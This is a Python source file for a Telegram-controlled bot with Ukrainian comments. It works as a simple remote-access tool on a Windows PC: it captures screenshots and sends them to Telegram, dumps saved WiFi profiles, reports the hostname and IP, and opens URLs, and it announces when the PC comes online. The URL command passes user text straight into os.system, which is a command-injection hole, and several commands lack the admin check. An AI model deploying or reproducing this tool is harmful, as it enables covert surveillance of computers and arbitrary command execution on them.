import asyncio
import os
import sys
import pyautogui
import cv2
import socket
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile

TOKEN = "ТВІЙ_ТОКЕН"
ADMIN_ID = 12345678  # Твій ID, щоб тільки ти керував

bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- ФУНКЦІЇ АДМІНІСТРУВАННЯ ---

@dp.message(Command("hel"))
async def help_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    text = (
        "Команди керування:\n"
        "/f - Зробити скріншот\n"
        "/v - Записати відео (тестово 5 сек)\n"
        "/pf - Отримати назви WiFi\n"
        "/wed [посилання] - Відкрити сайт\n"
        "/gio - Назва ПК та IP"
    )
    await message.answer(text)

@dp.message(Command("f"))
async def make_screenshot(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    screen = pyautogui.screenshot()
    screen.save("screenshot.png")
    photo = FSInputFile("screenshot.png")
    await bot.send_photo(message.chat.id, photo)
    os.remove("screenshot.png")

@dp.message(Command("gio"))
async def get_info(message: types.Message):
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    await message.answer(f"💻 ПК: {hostname}\n🌐 Локальний IP: {ip_addr}")

@dp.message(Command("wed"))
async def open_url(message: types.Message):
    url = message.text.replace("/wed ", "")
    if "http" in url:
        os.system(f"start {url}") # Для Windows
        await message.answer(f"Відкрито: {url}")

@dp.message(Command("pf"))
async def get_wifi(message: types.Message):
    # Тільки назви профілів для прикладу
    import subprocess
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866')
    await message.answer(f"Профілі WiFi:\n{data}")

# --- АВТОЗАПУСК ТА СТАРТ ---

async def on_startup():
    # Повідомлення при запуску
    hostname = socket.gethostname()
    try:
        await bot.send_message(ADMIN_ID, f"🚀 ПК {hostname} онлайн!\nВведіть /hel для списку команд.")
    except Exception as e:
        print(f"Помилка сповіщення: {e}")

async def main():
    await on_startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())